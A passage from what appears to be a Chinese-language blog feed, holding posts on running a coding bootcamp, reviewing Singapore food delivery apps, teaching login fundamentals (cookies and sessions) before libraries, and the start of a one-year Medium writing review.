href="https://github.com/Lidemy/mentor-program-2nd/issues">學生的心得</a>都完整公開出來。沒什麼好不透明的，連課程的缺點我都很樂意直接跟你講。我自己覺得這樣做很好，把優點跟缺點都放在你面前，由你自己去選擇，而不是隱惡揚善試圖去把你拐進來。</p><p>關於學生的心得，我很討厭那種內容農場標題的心得文，而且有的不只標題是內容農場，內文也長得很內容農場，一直「這個」、「那個」到底是在公三小。我要的不是農場文，是你的心得；我要的也不是課程的業配文，而是誠實的心得。</p><p>我跟學生邀稿寫心得的時候，一定會跟他們說你寫什麼都可以，內容不限，長度不限，好的壞的都可以寫，盡量把缺點給寫出來，因為這樣我才能知道怎麼改善課程。</p><p>我從來不怕把這堂課程的缺點展現在大家面前，因為這樣才真實。如果你只想看優點或是只看得到優點就不真實了，那叫做假象，更甚者是欺騙。</p><p>我也不會說什麼你沒學程式就是魯蛇，來這邊轉職成工程師就可以變為人生勝利組。不是這樣的，寫程式沒有比較高尚，職業跟薪水不是讓你拿來做比較的，比起這些無謂的比較，找一份讓你能開心的工作比較實在。</p><p>如果你寫程式感到開心那當然很好，如果是為了錢想要轉職成工程師那也可以，因為錢可以讓你覺得開心。可是工程師這個職業跟其他職業都一樣，沒有高下之分，沒什麼好比的，人比人，氣死人；蛋糕比蛋糕，氣死蛋糕。想當工程師也很好，不想當工程師也很好。</p><h3 id="下次能怎樣改進（如果還有下次）"><a href="#下次能怎樣改進（如果還有下次）" class="headerlink" title="下次能怎樣改進（如果還有下次）"></a>下次能怎樣改進（如果還有下次）</h3><p>第一點當然是多錄一些影片並且把課程大綱調整成我前面說的那三個階段，這樣子在課程的進度上應該大家會比較一致，對於進度較快的同學也必須提供加強版的作業讓他們練習，避免他們覺得無聊。</p><p>第二點是記得要加上複習週這個很棒的 idea，畢竟休息也是很重要的，在往下一個階段邁進前來個複習週讓大家複習一下，也可以讓進度落後的同學趁著這個複習週追上一些進度。</p><p>第三點是可以把 Lidemy OJ 給放進去，從第二週開始就每週指定幾題讓大家去寫，維持手感並且培養這種程式解題的觀念，如果順利的話可能到後半段還可以教一些簡單的演算法像是 DFS 跟 BFS 之類的。</p><p>第四點是一二週可以把網頁簡易爬蟲也加進去講，因為我後來發現很多同學搞不清楚 HTTP，這部分我花了滿多心力去解釋，但如果先教爬蟲相關的一些概念，我覺得可以幫助學生們去理解網路這個東西，會知道其實瀏覽器也就只是一個程式而已，任何人都可以發 request 到任何位置去。</p><p>第五點是專案的改進，目前貫穿整個課程的是留言板這個作業，我覺得以留言板作為主軸還是很不錯的，但還可以再加上幾個簡單的小專案分散在各週，例如說 Job board 或者是簡易的部落格等等。</p><h3 id="課上完了，然後呢？"><a href="#課上完了，然後呢？" class="headerlink" title="課上完了，然後呢？"></a>課上完了，然後呢？</h3><p>課程學習的時間結束了，我教學的部分也告一段落，但整個計畫還沒。</p><p>要到三月中這個計畫才會正式結束，有許多學生還在努力著，而我也會跟著一起。在這段期間應該是持續提供協助，然後想想我還有什麼可以做的，順便調整一下課程大綱為下一期作準備（如果有下一期的話）。</p><p>最近有些學生出去面試，根據他們出去拿到的回饋我自己也想了很多，覺得除了教學這段重要以外，最後出去求職的面試指導也很重要，畢竟有能力是一回事，你有沒有辦法把能力在面試時展現出來又是另外一回事，有些人技術 60 分面試 90 分，有些人技術 90 分面試 60 分，沒有好好表現的話滿可惜的。</p><p>第二期這樣帶也把課程又上了一次，大概也抓到幾個一定要調整的地方，覺得課程的前後端比重可以再調整一下，課程的時間長度我也有在考慮調整，總之可以調的地方還滿多的，這期收穫滿滿，人多果然就是收到的回饋比較多也會更容易知道怎麼調整。</p><h3 id="心得感想"><a href="#心得感想" class="headerlink" title="心得感想"></a>心得感想</h3><p>原本文章其實到上面就結束了，但我先貼給學生看以後有人反映説這篇很像報告比較硬一點，想看一些我的個人感想，我仔細想一想的確也是，所以最後補了這段。</p><p>老實說我已經差不多忘記當初開這個計畫時的心情了，不是說初衷忘記了，而是當初的那種衝勁或是那種感動被時間沖淡了。</p><p>我只記得我覺得自己有能力設計比別人好的課綱也有能力教，但「我覺得」是沒有用的，我有責任證明這件事情，所以這個計畫的最根本原動力是自我實現，這我之前也講過滿多次的了。</p><p>可是儘管現在 4 個半月過去只有 10% 的人找到工作，我依然沒有被打擊到。我認為這件事情只是在告訴我說：「用我的教學四個月找到工作是有可能的，但不是對大多數人都有用的方法」，所以我有可以優化的空間，讓這整個計畫變得更好。</p><p>結果對我來說其實沒那麼重要，重要的是中間學習到的過程，重要的是結束以後要如何把課程改得更好。我對教學這件事情是有信仰的，而有無信仰的差別就在於你是否會為了結果而改變。</p><p>「我可以幫助幾乎任何想要轉職工程師的人變成工程師，因為我很會教」，現在事實證明我目前無法達成這件事，但我會認為是「我可以做得更好」而不是「我做不到」，這就是為什麼我說這是信仰，或你要說我自我感覺良好也行。</p><p>我還是認為我的課綱跟教法相較於其他人有獨特的優勢，但以結果來說目前還無法把這個優勢突顯出來，所以我只能不斷改進以此證明我是對的。但有時候我也會想説這個好像也沒那麼重要，我證明這個要幹嘛？但想了想，我應該只是想證明給自己看，證明我是做得到的。</p><p>教學的路程中一直都處於一個迷惘的狀態，不知道自己是不是真的教得好、不知道自己是否真的有幫助到人，每次最開心的時候都是收到學生傳來的訊息與心得，例如說「那個 XXX 的地方教得真好」、「我在你身上學到很多」等等，就跟我看到部落格下方的評論講說我寫得很好也會很開心一樣，無論收到了多少次稱讚，每次都還是同樣地開心，因為我知道我有幫助到人。</p><p>我覺得老師跟學生是相輔相成、互相成長的關係，我自己就真的從學生的回饋上面學到很多，無論是做人處事上的或者是教學上的。教學這件事情談課綱談教材都只是基礎中的基礎，你還得留意學生的心理狀況，偶爾來個精神喊話，試圖讓他們維持動力繼續學習，在教學的過程中會突然理解以前自己當學生時為什麼有些老師會那樣做（例如說補習班老師講笑話之類的），角色互換之後滿有趣的。</p><p>學生感謝我，我也感謝學生們，教學相長不只是說說而已，我相信我們彼此是真的都學到了很多。</p><p>而關於教學我前陣子也想了很多，有想過投靠別人把資源整合、有想過自己跳出來專心創業弄教學，也有想過先把從零到一這塊放著，轉而專注在從基礎到進階，提升其他工程師的實力。不過無論怎麼想，好像都沒想過放棄這回事，不是因為我不想放棄，而是放棄教學這件事我沒辦法想像。</p><p>寫部落格跟教學對我來說就是吃飯喝水，不會特別花費心力也不會特別感受到它的存在，算是我生活的一部分，所以我考慮的只有：要寫什麼、要教什麼，而不是要不要寫、要不要教。一定會繼續教，但可能形式不一樣（寫技術部落格也算是教學的一種）。</p><p>或許就是這樣才有趣吧，永遠都會進步的空間，永遠都能不斷地調整讓自己變得更好。我目前最期待的就是 3&#x2F;14 那天計劃第二期結束，相比第一期可以有更多的樣本來跟大家分享第二期的成果究竟為何，無論結果是好是壞我都很期待。</p><p>就像以前高中考模擬考時我巴不得考完就直接看到成績，結果是好是壞都無所謂，因為至少我看得到結果。能看到結果就代表你有東西可以衡量，能衡量就代表你能夠調整。考得好你可以自豪、可以整理有哪些地方做得好；考不好你可以檢討、可以想說下一次要怎麼做得更好。無論結果如何都是好的，因為你終究會變得更好。</p>]]></content>
      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三百個訂單後，再次評比訂餐外送 App</title>
      <link href="/2019/01/01/delivery-300-311d531e1e65/"/>
      <url>/2019/01/01/delivery-300-311d531e1e65/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/delivery-300-311d531e1e65/0__kIiR6fG71PjGIk7o.jpg"></p><p>一年多前寫了這一篇：<a href="/2017/10/21/delivery-services-2d90ec1e3555/">四款訂餐外送 App 不專業評測</a></p><p>當初只是因為有些心得想跟大家分享，沒寫到一年間也獲得了滿多流量，更有許多網友用了裡面的優惠碼，讓我大概多了十張五塊新幣的 coupon，在這邊感謝一下。</p><p>一年多以後新加坡的外送市場有了些許變動，UberEATS 被 Grabfood 給取代，deliveroo 推出會員制，honestbee 跟 foodpanda 的 App 應該都有了些改版，免外送費也不再是常態。</p><p>剛剛稍微統計一下從 2017 年 5 月到目前為止，一共一年半的時間，我（或者說我們家）總共叫了 307 次外送：</p><p>honestbee 186 次<br>deliveroo 80 次<br>foodpanda 35 次<br>Grabfood 6 次</p><p>有了這麼豐富的經驗之後，這次不再做什麼麻煩的評分表格了，直接把感想一一寫出來。</p><h3 id="誠實蜜蜂-Honestbee"><a href="#誠實蜜蜂-Honestbee" class="headerlink" title="誠實蜜蜂 Honestbee"></a>誠實蜜蜂 Honestbee</h3><p>會在這邊叫這麼多次外送，主要是因為這一間還是時常會有免運費的活動，可能是期間限定或者是店家限定，但跟其他間比起來，誠實蜜蜂絕對是最容易找到免運費的一間。</p><p>但是，優點就僅止於這個了。</p><p>第一個缺點是 App 速度慢慢慢，開個頁面要轉圈圈等個 5、6 秒簡直是常態，每次我都會等到懷疑人生，想說是不是自己網路的問題，但打開其他外送 App 就立刻解決了我的疑惑，是它的問題不是我的。這個十分異常的秒數我也很好奇是怎麼做到的，這秒數讓使用者體驗變得極差，但往好處想可以培養耐性，有想要培養耐性的朋友歡迎試試。</p><p>第二個缺點是有時等待確認時間過久。一般來說外送 App 都會有四個階段：</p><ol><li>訂單送出，等待店家確認</li><li>店家已確認，製作中</li><li>外送員已取貨，正在外送途中</li><li>送達</li></ol><p>大部份時候 1 跟 2 之間是沒有什麼間隔的，約 5 秒內就會轉變狀態（不知道是系統自動還是人工，或我猜店家應該可以調整模式之類的），這時候如果碰到過一兩分鐘都還沒從 1 變成 2 的店家，就會有點擔心。</p><p>為什麼擔心呢？</p><p>因為新加坡的外送需求是十分龐大的，我通常習慣在上午 11 點時就挑選自己想吃的，想辦法在 11:20 以前送出訂單，因為一但過了這個較早的時段，外送需求就會呈指數型成長，原本 30 分鐘的預估時間立刻變成 60 分鐘，甚至還會把店家先下架不開放訂餐以舒緩人潮。</p><p>有時候一訂了就忘記確認狀態，最後等了十分鐘發現都沒有被確認，就會想說是不是系統故障或是根本不給訂其實被騙了，所以對消費者來說這種體驗也是不好的，如果一段時間（例如說五分鐘）之內都沒被確認的話，可以提醒一下消費者，或者是設定一個自動取消的機制，都會比讓我在那邊乾等，等了十幾分鐘店家把我訂單取消來得好。</p><p>大概就是這兩個缺點了，第二點不常發生，但第一點每次都發生，這是讓我沒辦法給予誠實蜜蜂好評的一個關鍵。</p><h3 id="空腹熊貓-Foodpanda"><a href="#空腹熊貓-Foodpanda" class="headerlink" title="空腹熊貓 Foodpanda"></a>空腹熊貓 Foodpanda</h3><p>除了需要運費以外，沒有什麼太大的缺點，我覺得在使用上跟 deliveroo 差不多好用，除此之外還有一個很大的特點，那就是支援宵夜。</p><p>其他 App 大概到十點多就沒東西可以訂了，因為外送員也休息了，但 foodpanda 有幾間店支援宵夜，半夜兩三點都還可以叫東西來吃，我有一次失心瘋居然半夜兩點叫外賣（一叫立刻後悔），點了一間賣烤串的店，事實證明是真的會送到。</p><p>然後還有一個缺點，那就是有時候外送員會「未到先按」，還沒送達但是就在自己的 App 上標註送達，我這邊就會收到已送達的訊息，可是東西根本還沒來。</p><p>會這樣子我猜是因為送餐有個預估時間，為了不要讓這個預估時間超過，所以送餐員會假裝已送達，在系統那邊就是準時送到，有些消費者沒注意到可能也就這樣過去了。我曾經碰過對方按了已送達，但過了 15 分鐘才送到的情形，跟客服反映過後也沒得到什麼結果。</p><h3 id="Grab-food"><a href="#Grab-food" class="headerlink" title="Grab food"></a>Grab food</h3><p>在剛推出的時候用過一兩次，體驗極差，朋友也發生過那種對方說已送達但根本還沒送到的靈異現象，或者是外送時間比預估的多超級多（預估 30 分鐘結果花了 1 小時那種），總之體驗都不好。</p><p>後來系統應該有慢慢穩定了，我只有想吃麥當勞的時候會用這個，因為它跟麥當勞獨家合作，只有這邊叫得到。</p><p>還有一個會令人卻步的點就是它的外送費是跟 Grab 一樣機制的，需求高時會漲價，假日午晚餐時段會漲價到 5 塊外送費，這邊標準價格是 3 塊，也就是變成平常的 1.7 倍，所以沒有特殊理由我不會去用它，外送費太貴。</p><p>噢對了，還有另一個優點是有些店家會沒有低消，點多少都可以，相較之下其他 App 都會有低消 12 塊的限制，誠實蜜蜂沒滿 12 塊要加 5 塊（超奇怪，我點 11 塊的東西會算我 16 塊…），deliveroo 沒滿 12 塊會自動算成 12 塊（比蜜蜂合理許多），相比之下 Grabfood 就比較沒這限制，適合一個人點餐。</p><h3 id="戶戶送-Deliveroo"><a href="#戶戶送-Deliveroo" class="headerlink" title="戶戶送 Deliveroo"></a>戶戶送 Deliveroo</h3><p>放壓軸就代表這是我覺得做得最好的服務。</p><p>UI 跟使用者體驗都很不錯，在每個階段都會有不同的推播通知，例如說訂單送出之後找到外送員，會推播跟你說已經找到外送員了，外送員送出的時候也會跟你說，快到的時候也會跟你說，讓你不用自己主動一直去確認狀態，我覺得這點做得很好。</p><p>跟誠實蜜蜂一樣會有一些優惠但不多，有提供外送優惠的店家數量極少，不過前陣子推出了會員制，一個月 10.9 新幣可享免運費跟指定店家優惠，算一算只要一個月叫外送超過 4 次其實就回本了，常常在訂外送的話十分划算，就不用考慮運費這種東西了。</p><p>整體而言，從各個角度來看 deliveroo 除了運費這點輸誠實蜜蜂以外，其他都大勝，因此買了會員之後就變叫外送的首選。</p><h3 id="結論"><a href="#結論" class="headerlink" title="結論"></a>結論</h3><p>之前寫的那篇文最後結果是同燈同分，經過一年的外送洗禮以後見識了外送的人生百態（湯灑出來、東西送錯、假裝送達、預計半小時等了一個半小時、取消訂單卻還是送過來），對這些外送服務也有了自己的評價，所以這次不再是同燈同分了。</p><p>如果你想要最划算的選擇，就用誠實蜜蜂（如果他還是持續有免運費的話），否則就用 deliveroo 就對了。</p><p>如果大家運費都是一樣的，推薦順序是 deliveroo &gt; foodpanda &gt; honestbee &gt; grab food。</p><p>就是這樣，祝大家吃得愉快。</p>]]></content>
      
      
      <categories>
          
          <category> 科技 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科技 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>There is no magic in my classroom</title>
      <link href="/2018/11/22/there-is-no-magic-in-my-classroom-4926b67c06f5/"/>
      <url>/2018/11/22/there-is-no-magic-in-my-classroom-4926b67c06f5/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/there-is-no-magic-in-my-classroom-4926b67c06f5/0__beKPypfxkyRPpF__M.jpg"></p><p>什麼是 Magic？</p><p>當你下一行指令，就幫你把 controller 變出來；當你下一行指令，就自動幫你把整個 React 環境建設好；當你下一行指令，不用寫 SQL 卻能幫你把資料庫建好，這就是 magic。</p><p>對程式開發而言，這當然是好事，幫你節省了一大堆時間，讓你不用從頭把開發環境建起來，不用每次東忙西忙只是為了把基本的架構搭好。你只要打個幾行指令就把東西變出來了，工作變得比以前有效率許多。</p><p>但這對學生來說不是一件好事，或更甚之，我會說這是有害的。</p><p>先強調一下，這篇文中指的學生是指那些沒有什麼程式基礎然後跑來學程式的學生，意思是他可能只懂基本的迴圈、判斷式、函式，其餘什麼 hash function、cookie、session、webpack 對他來說都是全新的名詞。</p><h3 id="知其然而不知其所以然"><a href="#知其然而不知其所以然" class="headerlink" title="知其然而不知其所以然"></a>知其然而不知其所以然</h3><p>首先，用這些 magic 來教學生的問題在於它始終就是 magic，是經過包裝的東西，是比較上層的東西。</p><p>誠如我在開頭所說，對開發者當然是好事，因為可以「節省開發時間」，可是對學生來說，節省了什麼時間？節省了開發時間嗎？不對，因為學生不用 magic 就不會開發了，所以無從比較。</p><p>節省的是「學習時間」，原本應該要學的基礎，卻被 magic 給取代了。教了 rails，所以學生不懂原來世界上有種東西叫做「沒有架構」；教了 firebase 或是 passport 來做登入，所以學生不懂原來登入機制只不過是 cookie 跟 session 的應用。教了 ORM，所以學生不懂原來資料庫還可以下指令去查詢。</p><p>就是因為他們只會這些 magic，才導致有一大堆學生回答不出「cookie 跟 session 的區別」、「我要插入一行資料的 SQL 指令怎麼下」這種基礎到不行的問題。</p><p>這時候你可能會用一個例子來反駁，例如說腳踏車：</p><blockquote><p>wait wait wait，不對欸，我們騎腳踏車的時候就是直接學騎腳踏車了，難道你會先去了解腳踏車的構造嗎？</p></blockquote><p>這個例子看似合理，但仔細想就會發現這個類比跟我們所說的 magic 有根本性的差異。</p><p>如果腳踏車壞掉了，你要懂的怎麼修嗎？如果是落鏈而已那你可能要會，但不是必須（我到現在都還不會修落鏈），大多數時候你會直接拿去給腳踏車行檢查。</p><p>如果你家汽車壞掉了，你要懂的怎麼自己修嗎？不用，因為你從沒學過所以也不會修，而且也沒必要會，所以你會直接把車子送去車廠維修。</p><p>如果今天你用的登入套件壞了，你發現你登入完之後 server 有記錄，可是瀏覽器這邊就還是顯示未登入的狀態，你要會修嗎？</p><p>不用，因為你找你主管求救就好。</p><p>這就是為什麼你主管想把你開除掉，你現在懂了吧。</p><p>上面開個小玩笑，答案是：要，你必須要會修。</p><p>為什麼？因為你的目的是「完成登入功能」、「完成這個專案」，所以一但跟登入功能有關的東西壞了，都要有能力把它修好。</p><p>這就是腳踏車比喻之所以不適當的原因。我們不用知道腳踏車怎麼做，是因為我們騎腳踏車的目的是：「從 A 點帶我到 B 點」，如果腳踏車壞了，我們可以走路、可以搭公車。</p><p>我們需要知道登入機制實際怎麼運作，因為我們的目的就是「完成登入功能」，如果你用的套件壞了，你要知道怎麼試圖去修它，或是可以選擇根本不用套件，因為你本來就知道登入功能怎麼做。</p><p>聽起來應該很合理，但這邊要再問一個問題來混淆你：</p><blockquote><p>如果電腦壞掉，我需要知道怎麼修嗎？</p></blockquote><p>根據剛剛的論述，我們的目的是完成登入功能，如果電腦壞掉就沒辦法達到這個目標，所以我們好像必須知道怎麼修電腦。</p><p>如果是這樣的話，不就代表我必須從電腦的硬體組成開始學，還要學會怎麼自己組電腦？或甚至再往下推，如果 CPU 壞掉我也要修的話，我是不是要去看電子學，去看底下的訊號怎麼運作，去學怎麼修好一個電路板？</p><p>聽起來怪怪的，怪怪的，怪怪的怪怪的怪怪的。</p><p>在談論這些東西時，我們會希望有一個「預設」存在，否則就會一直無限上綱最後偏題偏的很嚴重。例如說我們在談腳踏車的範例時，也同樣可以舉例說：「那地面塌了我要會修路嗎？」，但這已經超出原本問題的範疇了，因此我們應該會同意：「先預設地面是好的」</p><p>同樣地，當我們談登入機制時，也會預設電腦是好的不會壞掉，如果真的壞掉的話也會找專業的來修，就像地面壞掉也不是你修而是會找專業的工人來修一樣，這就是專業分工，每個人有不同的職責範圍，你負責自己範圍裡的東西就好。（當然，你想懂其他人的職責範圍也可以，但不是必要）</p><p>除非在你的公司（或你想去的公司）裡面，負責用套件寫登入機制的是一個職位，套件壞掉時要來修 bug 的又是另一個職位，那我支持你可以只會用套件，因為不懂登入機制也沒關係，專業分工嘛。</p><p>若是你剛好有聽過這樣的公司，麻煩告訴我一下，我會跟我的學生們說最好不要去。</p><h3 id="漢字序順並不定一影閱響讀，教學順序呢？"><a href="#漢字序順並不定一影閱響讀，教學順序呢？" class="headerlink" title="漢字序順並不定一影閱響讀，教學順序呢？"></a>漢字序順並不定一影閱響讀，教學順序呢？</h3><p>教學生套件而不教底層運作，顯然是一件不恰當的事情，那如果教套件也教底層運作，問題是否就迎刃而解了？</p><p>是，不過這邊還有一個細節可以討論，那就是有兩種教學順序。一個是先教套件再教底層運作，另一個是先教底層運作再教套件，我覺得大多數課程都是偏向前者，我的觀察啦。</p><p>但我個人是後者的死忠粉絲，有加入後援會還有定期繳會費，聽演唱會時會一起應援喊口號的那種。</p><p>舉個例子好了，假設今天教登入機制，你教了一個現成的套件來做這件事，在前端呼叫一下 SDK 提供的某個 function，在後端也呼叫一下，確認有接起來之後登入功能就這樣神奇地完成了，magic 🧙！</p><p>先確認學生都會使用套件以後，再來跟他們講登入機制，解釋說背後其實都是靠 cookie 跟 session 這兩個東西，只是被我們的套件包裝起來了所以你看不到。</p><p>這時學生應該就會：</p><blockquote><p>喔～原來是因為這兩個東西啊</p></blockquote><p>好的教學會再讓學生用這些基本的東西實作一遍，沒那麼好的教學就這樣帶過去了。因此學生知道是 cookie 跟 session，但是從來沒有實際用過，因為套件就幫他們搞定一切。</p><p>那我們試著換另外一種順序來教學生。</p><p>先教學生 cookie，跟他們說這沒什麼，就只是個存在瀏覽器上的資訊而已，然後瀏覽器會幫你帶給 server。接著講身份驗證，最簡單的方法就是你在 cookie 裡面存帳號，這樣 server 不就知道你是誰了嗎？</p><p>可是 cookie 的東西是可以被竄改或是偽造的，所以可以選擇把 cookie 的內容加密，或也可以選擇在 server 隨機生成一組亂碼，把這串亂碼放到 cookie 去，只要誰能給你這串 cookie 就能證明身份。</p><p>這就像是複雜版的灰姑娘，先預設每個人腳的大小都不一樣，所以一隻鞋子只會有唯一一個人穿得下，誰穿得下那雙鞋子，誰就一定是灰姑娘。</p><p>或我們可以說這是通行證，認證不認人，只要你拿得出來這個通行證，我們就能驗證你的身份。而這個通行證是沒辦法被偽造的，因為上面有一大堆防偽機制。</p><p>上面這個機制就叫做 session，因為敏感資訊不能存在 client，所以只好存在 server，而 client 跟 server 就靠著這張通行證驗證身份，例如說 server 記住通行證編號 eij2f94ij92fj9 的是小明，小明只要出示通行證就可以驗證身份，而且沒人猜得到 eij2f94ij92fj9 這個通行證編號。</p><p>那通行證被偷了怎麼辦？小偷就可以冒用你的身份了，因為認證不認人。所以身為一間有資訊安全意識的公司，如果一大堆用戶的通行證真的不幸被偷走，有種做法是把所有通行證作廢，跟大家說：「麻煩重新再來簽到一遍，之前的通行證全部無效」，小偷偷到的東西就一點用都沒有了。</p><p>好，這樣你就知道為什麼臉書之前 access token 被竊取時你被強制登出了，不用客氣。</p><p>介紹完 cookie 跟 session 以及與登入機制的關係後，就要靠著實作來加深印象，確保自己除了理論以外實作也是一把罩，能夠實作出簡易的登入機制。</p><p>再來才是教套件的時間。</p><p>因為自己有實作過這整套機制，一來能夠很清楚理解這個運作，二來能夠體會自己一個人做這整套有點麻煩，所以才會有套件這種東西出現，幫你把這些東西包裝好，讓你只要會用就好。</p><p>這時候，學生的感想可能是：</p><blockquote><p>喔～不過就是把之前那些東西包裝起來而已嘛</p></blockquote><p>好了，兩種方式都介紹完了，一個先講套件再講原理，一個先講原理再講套件，比較一下這兩種順序，你覺得哪一種比較好？</p><p>我覺得後者比較好。</p><p>前者對我來說就像是看電影有人爆雷一樣，先跟你講結局，再跟你解釋劇情的發展，說明為什麼最後會導致這樣的結局，先知道了結果，再來看原因。</p><p>如果很不巧地這還是一部懸疑電影，那一切的觀影樂趣就沒有了。因為前面鋪的梗都沒有用，你都不會被誤導，因為你已經知道最後的結果是什麼了。</p><p>而後者就是平穩地看完一部電影，一步步跟著劇情發展而全心投入在裡面，角色哭你也哭，角色笑你也笑，好像自己就是劇中的主角一般，一同感受著喜怒哀樂並且把自己投射進去。</p><p>當結局到來，電影播放完畢以後，會對這部電影有著專屬於你自己的感想，會從之前那些劇情試圖去解釋為什麼導致這樣的結局，而這樣的結局又代表著什麼樣的意義。</p><p>順帶一提，為了不被破壞觀影樂趣以及增加不確定感，我現在連電影預告片都不看了。</p><h3 id="啊多麽痛的領悟"><a href="#啊多麽痛的領悟" class="headerlink" title="啊多麽痛的領悟"></a>啊多麽痛的領悟</h3><p>原本這篇文章差不多到這邊就要結束了，可是我突然發現一個問題：雖然我上面說我支持先講原因再講結果，可是在我自己的教學中，有些內容卻是反過來的。</p><p>舉例來說，我教 hoisting 的時候就只先講說這個的結果是這樣，並不是直接從它的原理開始講述為什麼會有這個結果。</p><p>完了，這不是自打嘴巴嗎。</p><p>為了避免這種自相矛盾，我後來很認真地想了一下，終於想到了原因：</p><blockquote><p>決定順序的重點在於「感同身受」</p></blockquote><blockquote><p>在於「痛苦」</p></blockquote><p>像我們上面登入機制的那個舉例，如果你一開始就學套件，你會痛苦嗎？不會，你會覺得很快樂，想說登入機制怎麼這麼簡單，幾行程式碼就搞定了。</p><p>但若是從基礎開始學，實作完整個機制以後雖然很有成就感，但也會伴隨著一定的痛苦，因為很麻煩。你這邊要記得加一個 cookie，那邊要記得把東西放到 session，還要接 Google 登入、Facebook 登入，還有一堆你根本沒聽過的網站的登入。</p><p>當你研究一堆官方文件弄到頭昏眼花的時候，看到你隔壁同學快樂地用著套件，跟你說登入好簡單，你是不是會覺得痛苦，並且在心裡默默唱著：「阿多麽痛的領悟…」</p><p>於是你下定決心，下一次直接用套件就好，幹嘛把自己搞得那麼累，並頓時覺得海闊天空，這空氣多麽的清新，這世界多麽美好。</p><p>當我問你為什麼要用套件時，你會心如死灰地跟我說：「因為自己串真的很累…真的…」，當我問你隔壁同學為什麼要用套件時，他可能會說：「因為老師叫我用的」</p><p>所以，為什麼會有那麼多套件出現？就是因為有一大堆前輩經歷過種種磨難以後，決定造福世人也造福自己，才產生了這些方便又好用的套件。</p><p>那為什麼前輩都決定要造福世人了，我卻一再提倡大家繼續受苦？</p><p>因為這是成長必經的過程。</p><p>舉一個現實生活中的例子，很多父母生下小孩以後細心呵護，不想讓他受到任何一點點傷害，於是把家裡弄的超級乾淨，所有用的東西都標榜著無菌、抗菌，床組也是號稱能防塵蟎的昂貴進口貨。</p><p>投入了這麼多的心血，想當然在家裡孩子過得很好，可是一但出門了怎麼辦？因為從來沒有過敏過，所以碰到一點細菌就過敏的更嚴重。如果從來沒有跌倒過，一但摔跤了連爬起來不會。</p><p>這就是過度保護，出發點是好的但是手段太過了。</p><p>我認為學程式也是一樣的，身為一個老師，當你走過了那些崎嶇的路，你要做的不是避免學生再次走過那些路，而是刻意塑造出一種較安全的環境，並且引導他們再次走過。</p><p>所以他們不會因為太崎嶇就放棄，因為坡度是你設計過的；也不會因為路太長而放棄，因為長度也是你設計過的。儘管他們可能體會不到，但這環境是你特別設計出來的。</p><p>之前有個學生在意見回饋時貼給我一篇我覺得很棒，來源是<a href="https://www.facebook.com/photo.php?fbid=2304458812903327&set=a.109637015718862&type=3&theater">宋尚緯</a>的臉書：</p><blockquote><p>大家都會誤會一個人如果有很多粉絲／閱讀者／觀看者的話就一定是因為他把東西變得簡單。把複雜的東西變成簡單那的確是功夫，而且功力深厚與否會直接影響接收端的群體組成。最理想的狀況是簡單的事物能夠成為一個連結中高端知識內容的梯子，讓人能夠循序前進。</p><p>一個高端知識，寫的人寫得再好，接收端沒有前置知識也是看得一頭霧水的。但如果大家誤會以為只要將東西寫得簡單就有人去讀，那就純粹是誤會了，簡單之外也要好看啊。</p></blockquote><p>對我來說，好的教材就是經過各種算計之後造出一個梯子，每一階的距離都差不多，既不會長到讓人摔下來，也不會短到一點挑戰性都沒有，而學生就可以順著這個梯子一步步往上爬。</p><h3 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h3><p>一直以來我都抱持著這樣的理念在進行教學，無論是<a href="/2018/06/10/frontend-engineer-guide-297821512f4e/">跟著小明一起搞懂技術名詞：MVC、SPA 與 SSR</a>，背後都是用這種理念在寫文章。</p><p>因為我始終相信當你參與其中並走過那段歷史時，對於「現在」才會有更深刻的感受。把一個東西獨立拿出來教，它就只是一個點，但當你把它放進脈絡時，就能跟千千萬萬個點連在一起，成為一個完整的面。</p><p>本篇是我一些教學經驗以及想法的總結，如果你跟我一樣對教學很有興趣，或是根據你的經驗覺得我這篇的論點有點奇怪，認為有更好的做法，都歡迎留言或是直接私訊給我，我們可以交換一下想法。</p><p>如果你正在教人卻不知道教材應該如何設計，可以參考<a href="https://github.com/Lidemy/mentor-program-2nd">我在用的教材</a>（還有改進空間但目前堪用），想要用的話可以直接拿去用，註明出處就好，如果覺得有地方能夠改進也麻煩跟我說一下，我們可以一起讓它變得更好。</p><p>最後，感謝閱讀。</p><p>題外話，這篇比較偏「教」，之前寫過一篇類似但比較偏「學」的部分，有興趣的可以點擊連結觀看：<a href="/2018/10/29/learn-coding-9c572c2fb2/">當我們在學程式時，要學的到底是什麼？</a></p>]]></content>
      
      
      <categories>
          
          <category> 學習 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 學習 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一週年報告：在 Medium 上寫程式與科技類文章成效如何？</title>
      <link href="/2018/11/15/one-year-review-2963f072572d/"/>
      <url>/2018/11/15/one-year-review-2963f072572d/</url>
      
        <content type="html"><![CDATA[<p>在 Medium 上面跟程式相關的中文文章比較少，我猜原因之一是 Medium 本來就對一些技術文章不太友善（例如說要貼程式碼或者是比較自由的排版等等），所以很多人的技術文章還是習慣放在自己架的 blog。</p><p>而這點我當初也有考慮到，所以就決定在 Medium 上面放一些科普文，不要講到太深的技術細節，真的講得很深的技術文會放到我其他的 blog 去，這邊就是寫一些比較平易近人的東西。</p><p>雖然說標題寫了一週年，但我的<a href="https://medium.com/@hulitw/%E7%99%BE%E5%BA%A6%E4%BA%BA-3786536ef9c1">第一篇文章</a>其實是 2017 年 5 月 8 號發的，我記得那時候 Medium 剛在台灣小有知名度，我想說：「反正我已經在其他地方有 blog 了，應該不會用到這個吧」，所以就把我一些平常 po 在臉書的廢文拿來放在這邊備份，完全沒有要認真經營的意思，跟現在的走向完全不一樣。</p><p>直到過了五個月，我原來用的部落格服務 logdown 前景堪憂，只好積極找尋逃難之處，最後決定落腳在 Medium，在 10 月 5 號把我舊的文章修一下貼過來，並在 10 月 18 正式開始寫文。</p><p>前陣子看到滿多人發表自己經營 Medium 的心得，像是<a href="https://medium.com/@manzoo/medium-stats-2018-1-of-3-b32ab42b30d8">佛系經營 Medium 一年的成效報告</a>與<a 